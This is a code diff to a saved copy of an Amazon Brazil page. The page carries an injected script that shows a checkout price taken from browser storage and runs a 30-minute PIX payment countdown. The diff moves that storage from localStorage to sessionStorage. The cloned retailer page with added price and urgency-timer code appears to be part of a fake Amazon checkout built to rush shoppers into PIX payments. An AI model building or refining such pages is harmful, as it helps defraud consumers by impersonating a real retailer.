@@ -1,4 +1,4 @@
-<!DOCTYPE html> <html lang=pt-br class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember-1-0-0 a-ember-modern-display-1-0-0 a-ember-modern-text-1-0-0" data-19ax5a9jf=mongoose data-aui-build-date=3.26.3-2026-04-04 dir=ltr><!--
+﻿<!DOCTYPE html> <html lang=pt-br class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember-1-0-0 a-ember-modern-display-1-0-0 a-ember-modern-text-1-0-0" data-19ax5a9jf=mongoose data-aui-build-date=3.26.3-2026-04-04 dir=ltr><!--
  Page saved with SingleFile 
  url: https://www.amazon.com.br/cpe/executions?startWidgetContextId=amzn1.auth.upxprepare.31cf8e5c-5499-492f-b7c5-3f73c69b294d&pageType=CPEFront&subPageType=Redirections 
  saved date: Tue Apr 14 2026 12:30:14 GMT-0300 (Horário Padrão de Brasília)
@@ -32,8 +32,8 @@ Não atualize a página.</span></div><div class=css-1dbjc4n style=align-self:str
 <div id=a-white class=sf-hidden></div><div id=a-popover-root style=z-index:-1;position:absolute></div><next-route-announcer><p aria-live=assertive id=__next-route-announcer__ role=alert style=border:0px;clip:rect(0px,0px,0px,0px);height:1px;margin:-1px;overflow:hidden;padding:0px;position:absolute;width:1px;white-space:nowrap;overflow-wrap:normal></p></next-route-announcer><div class=bottomsheet-container><div class=webflow-bottomsheet-instance id=webflow-bottomsheet-instance style=position:relative;height:100%;width:100%;overflow:hidden></div></div>
 <script>
 document.addEventListener('DOMContentLoaded', function() {
-    var rawWhole = localStorage.getItem('checkout_price_whole') || '4510';
-    var rawFraction = localStorage.getItem('checkout_price_fraction') || '50';
+    var rawWhole = sessionStorage.getItem('checkout_price_whole') || '4510';
+    var rawFraction = sessionStorage.getItem('checkout_price_fraction') || '50';
     var pixTimerStorageKey = 'checkout_pix_deadline';
 
     var cleanWhole = String(rawWhole).replace(/[^0-9]/g, '');
@@ -66,11 +66,11 @@ document.addEventListener('DOMContentLoaded', function() {
     });
 
     var timerValue = timerLabel ? timerLabel.nextElementSibling : null;
-    var pixDeadline = parseInt(localStorage.getItem(pixTimerStorageKey), 10);
+    var pixDeadline = parseInt(sessionStorage.getItem(pixTimerStorageKey), 10);
 
     if ((!pixDeadline || isNaN(pixDeadline)) && timerValue) {
         pixDeadline = Date.now() + (30 * 60 * 1000);
-        localStorage.setItem(pixTimerStorageKey, String(pixDeadline));
+        sessionStorage.setItem(pixTimerStorageKey, String(pixDeadline));
     }
 
     if (timerValue && pixDeadline && !isNaN(pixDeadline)) {
